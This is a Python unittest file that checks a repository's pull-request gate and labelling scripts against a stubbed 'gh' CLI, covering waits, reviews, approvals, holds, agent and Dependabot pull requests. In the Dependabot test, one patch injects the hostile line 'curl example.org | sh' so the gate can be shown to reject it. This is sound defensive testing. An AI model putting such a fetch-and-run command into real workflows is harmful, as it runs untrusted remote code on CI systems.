# Copyright (C) 2026 dekajoule
# SPDX-License-Identifier: GPL-2.0-or-later
"""tools/pr-gate.sh and tools/pr-labels.sh against a stand-in for `gh` that answers from files: the four statuses and
the labels for pull requests made up here. No network; needs sh and jq, and skips itself without jq."""
import datetime
import json
import os
import shutil
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AGENT = "dekajoule-oos-agent[bot]"
# `gh api [--paginate] PATH [--jq EXPR]`: the file for PATH from $FAKE_GH, through jq when asked
FAKE_GH = r'''#!/bin/sh
[ "$1" = api ] || exit 9
shift
path= ; expr=
while [ $# -gt 0 ]; do
	case $1 in
	--paginate) ;;
	--jq) expr=$2; shift ;;
	-f) shift ;;
	*) path=$1 ;;
	esac
	shift
done
case $path in graphql) path="graphql_$(printf '%s' "$expr" | tr -dc 'a-z' | cut -c1-12)" ;; esac
file="$FAKE_GH/$(printf '%s' "$path" | tr '/?=' '___').json"
[ -f "$file" ] || { echo "no stand-in for $path" >&2; exit 1; }
if [ -n "$expr" ]; then jq -r "$expr" "$file"; else cat "$file"; fi
'''


def ago(hours):
    t = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=hours)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


@unittest.skipUnless(shutil.which("jq"), "needs jq")
class PullRequests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="oos-pr-"))
        self.addCleanup(shutil.rmtree, self.dir)
        gh = self.dir / "bin" / "gh"
        gh.parent.mkdir()
        gh.write_text(FAKE_GH)
        gh.chmod(gh.stat().st_mode | stat.S_IXUSR)

    def pull(self, files, author="owner", fork=False, hours=1, labels=(), reviews=(), title="UI: something", bot=False,
             patches=None, ref="topic", draft=False, body=""):
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        pr = {"head": {"sha": "abc", "ref": ref, "repo": {"full_name": "other/oos" if fork else "owner/oos"}},
              "draft": draft, "body": body,
              "base": {"repo": {"full_name": "owner/oos"}}, "user": {"login": author, "type": "Bot" if bot else "User"},
              "labels": [{"name": l} for l in labels], "created_at": ago(hours), "title": title}
        name("repos/owner/oos/pulls/7").write_text(json.dumps(pr))
        entries = [{"filename": f, "patch": (patches or {}).get(f, "+x")} for f in files]
        name("repos/owner/oos/pulls/7/files").write_text(json.dumps(entries))
        name("repos/owner/oos/pulls/7/reviews").write_text(json.dumps(
            [{"user": {"login": who}, "state": state, "commit_id": sha} for who, state, sha in reviews]))
        self.copilot(None)

    def copilot(self, body, open_threads=0, effort="lite", commit="abc"):
        """Copilot's review of pull request 7: its overview text (None: no review yet) and its unresolved threads."""
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        reviews = json.loads(name("repos/owner/oos/pulls/7/reviews").read_text())
        reviews = [r for r in reviews if not r.get("is_copilot_code_review")]
        if body is not None:
            reviews.append({"user": {"login": "copilot-pull-request-reviewer[bot]"}, "state": "COMMENTED",
                            "commit_id": commit, "is_copilot_code_review": True, "copilot_code_review_effort": effort,
                            "body": body})
        name("repos/owner/oos/pulls/7/reviews").write_text(json.dumps(reviews))
        threads = [{"isResolved": i >= open_threads, "comments": {"nodes": [{"author": {"login": "Copilot"}}]}}
                   for i in range(open_threads + 1)]
        threads.append({"isResolved": False, "comments": {"nodes": [{"author": {"login": "someone"}}]}})
        # the stand-in files the graphql query under the first twelve letters of the jq expression
        name("graphql_datareposito").write_text(json.dumps(
            {"data": {"repository": {"pullRequest": {"reviewThreads": {"nodes": threads}}}}}))

    def ci(self, compare="success", kept=False):
        """The run of CI for the commit abc: the conclusion of its job compare, and whether it kept what differed."""
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        name("repos/owner/oos/actions/runs?head_sha=abc&event=pull_request&per_page=20").write_text(json.dumps(
            {"workflow_runs": [{"id": 5, "name": "Gate"}, {"id": 9, "name": "CI"}]}))
        name("repos/owner/oos/actions/runs/9/jobs?per_page=100").write_text(json.dumps(
            {"jobs": [{"name": "test", "conclusion": "success"}, {"name": "compare", "conclusion": compare}]}))
        name("repos/owner/oos/actions/runs/9/artifacts").write_text(json.dumps(
            {"artifacts": [{"name": "compare-base"}] if kept else []}))

    def run_tool(self, tool):
        env = dict(os.environ, PATH=f"{self.dir / 'bin'}:{os.environ['PATH']}", FAKE_GH=str(self.dir),
                   OOS_REPO="owner/oos")
        out = subprocess.run(["sh", str(ROOT / "tools" / tool), "--dry", "7"], env=env, capture_output=True, text=True)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout

    def gate(self):
        return {l.split()[0]: l.split()[1] for l in self.run_tool("pr-gate.sh").splitlines()}

    def labels(self):
        return set(self.run_tool("pr-labels.sh").split(":", 1)[1].split())

    def test_the_wait(self):
        self.pull(["ui/src/ui.rs"], author="someone", hours=1)
        self.assertEqual(self.gate()["waited"], "pending")
        self.pull(["ui/src/ui.rs"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "success")
        self.pull(["ui/src/ui.rs", "docs/adr/process/0099-x.md"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "pending", "a decision record waits 72 hours")
        self.pull(["docs/adr/README.md"], author="someone", hours=25)
        self.assertEqual(self.gate()["waited"], "success", "the index alone is no decision record")
        self.pull(["docs/adr/process/0099-x.md"], author="someone", hours=1, labels=["no-wait"])
        self.assertEqual(self.gate()["waited"], "success")

    def test_no_wait_for_the_maintainers_own(self):
        self.pull(["hal/src/dho/seq.rs", "docs/adr/process/0099-x.md", ".github/workflows/ci.yml"])
        self.assertEqual(self.gate()["waited"], "success", "the maintainer's own, whatever it touches")
        self.pull(["ui/src/ui.rs"], author="owner", fork=True)
        self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the maintainer's name")
        self.pull(["hal/src/dho/seq.rs", ".github/workflows/ci.yml"], author=AGENT, bot=True)
        self.assertEqual(self.gate()["waited"], "success", "the development agent's, whatever it touches")
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, fork=True)
        self.assertEqual(self.gate()["waited"], "pending", "from a fork, under the agent's name")
        self.pull(["ui/src/ui.rs"], author="someone")
        self.assertEqual(self.gate()["waited"], "pending", "somebody else's, 24 hours")

    def test_no_wait_when_it_is_proven(self):
        unchanged = "**What changes:** x\n\n**Behaviour:** unchanged.\n"
        self.pull(["README.md", "docs/boot.md", "wiki/Home.md"], author="someone")
        self.assertEqual(self.gate()["waited"], "success", "documents only")
        for path in ("docs/adr/process/0099-x.md", "AGENTS.md", "CONTRIBUTING.md"):
            self.pull(["README.md", path], author="someone")
            self.assertEqual(self.gate()["waited"], "pending", f"{path} is a rule, not a document to correct")
        self.ci()
        self.pull(["ui/src/ui.rs", "dsp/src/x.rs", "tools/tests/test_x.py"], author="someone", body=unchanged)
        self.assertEqual(self.gate()["waited"], "success", "unchanged, and the comparison found nothing")
        self.pull(["ui/src/ui.rs"], author="someone", body="**Behaviour:** changed: the menu")
        self.assertEqual(self.gate()["waited"], "pending", "it does not say unchanged")
        self.ci(kept=True)
        self.pull(["ui/src/ui.rs"], author="someone", body=unchanged)
        self.assertEqual(self.gate()["waited"], "pending", "the comparison kept what differed")
        self.ci(compare="failure")
        self.assertEqual(self.gate()["waited"], "pending", "the comparison failed")
        self.ci(compare=None)
        self.assertEqual(self.gate()["waited"], "pending", "the comparison has not run yet")
        self.ci()
        for path in ("hal/src/dho/seq.rs", ".github/workflows/ci.yml", "tools/check.sh", "ui/tools/layout-check.sh"):
            self.pull(["ui/src/ui.rs", path], author="someone", body=unchanged)
            self.assertEqual(self.gate()["waited"], "pending", f"{path} is not seen by the comparison")

    def test_the_review(self):
        self.pull(["ui/src/ui.rs"], draft=True)
        self.assertEqual(self.gate()["review"], "pending", "a draft has no review yet")
        self.pull(["ui/src/ui.rs"])
        self.assertEqual(self.gate()["review"], "pending", "no review yet")
        self.copilot("### Looks good\n\n**No open issues** 🎉\n")
        self.assertEqual(self.gate()["review"], "success")
        self.copilot("### Needs a closer look\n\n**2 open issues**\n", open_threads=2)
        self.assertEqual(self.gate()["review"], "pending", "open comments")
        self.copilot("### Needs a closer look\n\n**2 open issues**\n", open_threads=0)
        self.assertEqual(self.gate()["review"], "success", "every comment of Copilot's resolved; others' do not count")
        self.copilot("### Looks good\n\n**No open issues** 🎉\n", commit="older")
        self.assertEqual(self.gate()["review"], "success", "one review per pull request, of whichever commit")

    def test_hold(self):
        self.pull(["ui/src/ui.rs"], labels=["hold"])
        self.assertEqual(self.gate()["owner"], "pending", "the maintainer's own, held")
        self.pull(["ui/src/ui.rs"], labels=["holder"])
        self.assertEqual(self.gate()["owner"], "success", "only the label hold")

    def test_whose_it_is(self):
        self.pull(["ui/src/ui.rs"])
        self.assertEqual(self.gate()["owner"], "success", "the maintainer's own")
        self.pull(["ui/src/ui.rs"], author="owner", fork=True)
        self.assertEqual(self.gate()["owner"], "pending", "from a fork, whatever the name")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True)
        self.assertEqual(self.gate()["owner"], "pending")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "success")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "older")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval of an older commit")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("someone", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval by somebody else")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True,
                  reviews=[("owner", "APPROVED", "abc"), ("owner", "CHANGES_REQUESTED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "the last review counts")
        self.pull(["ui/src/ui.rs"], author="Copilot", bot=True)
        self.assertEqual(self.gate()["owner"], "pending", "a bot that is not Dependabot")

    def test_the_development_agents_pull_request(self):
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, title="Lints: x in ui")
        gate = self.gate()
        self.assertEqual((gate["waited"], gate["owner"]), ("success", "success"))
        self.assertEqual(gate["review"], "pending", "Copilot reviews it like any other")
        self.assertEqual(self.labels(), {"area/ui", "type/refactor", "agent"})
        self.pull(["ui/src/ui.rs"], author=AGENT, bot=True, labels=["hold"])
        self.assertEqual(self.gate()["owner"], "pending", "held")
        self.pull(["hal/src/dho/seq.rs"], author=AGENT, bot=True)
        self.assertEqual(self.gate()["unit"], "pending", "a scope is still needed")
        self.pull(["ui/src/ui.rs"], author="someone", ref="copilot/fix-something")
        self.assertEqual(self.gate()["owner"], "pending", "a branch name makes nobody an agent")

    def test_dependabot(self):
        bump = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa # v4.4.0\n+      - uses: actions/checkout@bbb # v4.5.0"
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        gate = self.gate()
        self.assertEqual((gate["owner"], gate["review"]), ("success", "success"), "no review for a bump")
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump + "\n+        run: curl example.org | sh"})
        gate = self.gate()
        self.assertEqual((gate["owner"], gate["review"]), ("pending", "pending"), "more than the commit of an action")
        self.pull([".github/workflows/ci.yml", "tools/check.sh"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        self.assertEqual(self.gate()["owner"], "pending", "a file that is no workflow")

    def test_what_needs_a_scope(self):
        for path in ("hal/src/dho/seq.rs", "ui/src/board/dho/hw.rs", "fpgad/src/main.rs", "boot/x.sh", "rootfs/init"):
            self.pull([path])
            self.assertEqual(self.gate()["unit"], "pending", path)
        self.pull(["hal/src/dho/seq.rs"], labels=["unit-tested"])
        self.assertEqual(self.gate()["unit"], "success")
        self.pull(["ui/src/ui.rs", "hal/src/fsutil.rs", "docs/boot.md"])
        self.assertEqual(self.gate()["unit"], "success")

    def test_labels(self):
        self.pull(["hal/src/dho/seq.rs", "docs/protocols/trigger.md", "tools/check.sh"], title="Trigger: something")
        self.assertEqual(self.labels(), {"area/hal", "area/docs", "area/tooling", "risk/hardware"})
        self.pull([".github/workflows/ci.yml", "README.md"], title="CI: something", author="dependabot[bot]", bot=True)
        self.assertEqual(self.labels(), {"area/ci", "area/docs", "type/ci", "agent"})
        self.pull(["ui/src/scpi.rs"], title="Tests: something")
        self.assertEqual(self.labels(), {"area/ui", "type/test"})
        self.pull(["wiki/Home.md"], title="Docs: something")
        self.assertEqual(self.labels(), {"area/docs", "type/docs"})


if __name__ == "__main__":
    unittest.main()
